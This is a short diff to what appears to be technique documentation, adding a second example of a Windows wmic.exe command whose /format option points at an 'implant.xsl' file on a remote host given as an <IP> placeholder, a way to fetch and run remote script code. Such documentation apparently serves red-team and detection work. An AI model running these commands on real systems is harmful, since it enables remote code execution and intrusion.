@@ -17,6 +17,8 @@ version="1.0">
 Execute a script contained in the target `.xsl` file hosted on a remote server.
 
 ```
+C:\> wmic.exe os get /format:"http[s]://<IP>[:PORT]/implant.xsl"
+
 C:\> wmic.exe process get brief /format:"http[s]://<IP>[:PORT]/implant.xsl"
 ```
 
